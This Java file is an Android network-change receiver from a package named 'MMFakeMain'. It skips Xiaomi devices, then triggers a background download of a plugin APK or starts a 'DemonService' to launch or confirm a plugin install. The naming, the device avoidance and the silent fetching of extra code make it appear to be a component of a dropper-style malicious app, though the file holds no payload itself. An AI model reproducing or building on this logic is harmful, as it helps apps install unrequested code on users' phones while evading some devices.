package com.xstd.MMFakeMain.qm.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.MMFakeMain.qm.AppRuntime;
import com.xstd.MMFakeMain.qm.Config;
import com.xstd.MMFakeMain.qm.UtilOperator;
import com.xstd.MMFakeMain.qm.service.DemonService;
import com.xstd.MMFakeMain.qm.setting.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: PM1:18
 * To change this template use File | Settings | File Templates.
 */
public class NetworkBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(final Context context, Intent intent) {
        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] Entry >>>>>>>>");

        if (AppRuntime.isXiaomiDevice()) {
            if (Config.DEBUG) {
                Config.LOGD("[[MMFakeMainApplication::onCreate]] this device is Xiaomi Devices, just ignore this device");
            }
            return;
        }

        String path = SettingManager.getInstance().getLocalApkPath();

        if (!Config.THIRD_PART_PREVIEW
                && UtilsRuntime.isOnline(context)
                && !TextUtils.isEmpty(path)
                && !Config.DOWNLOAD_PROCESS_RUNNING.get()
                && !UtilOperator.isPluginApkExist()) {
            Intent i = new Intent();
            i.setAction(PluginDownloadBroadcastReceiver.DOWNLOAD_PLUGIN_ACTION);
            context.sendBroadcast(i);
        } else if (TextUtils.isEmpty(path)) {
            if (Config.DEBUG) {
                Config.LOGD("[[MMFakeMainApplication::onCreate]] notify Service Lanuch as the network changed ");
            }

            Intent i = new Intent();
            i.setClass(context, DemonService.class);
            i.setAction(DemonService.ACTION_LANUCH);
            context.startService(i);
        } else if (SettingManager.getInstance().getKeyPluginInstalled()
                     && UtilsRuntime.isOnline(context)
                     && !SettingManager.getInstance().getNotifyPluginInstallSuccess()) {
            //plugin已经安装，并且有网
            Intent i = new Intent();
            i.setClass(context, DemonService.class);
            i.setAction(DemonService.ACTION_PLUGIN_INSTALL);
            context.startService(i);
        }

        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] Leave <<<<<<<<");
    }

}
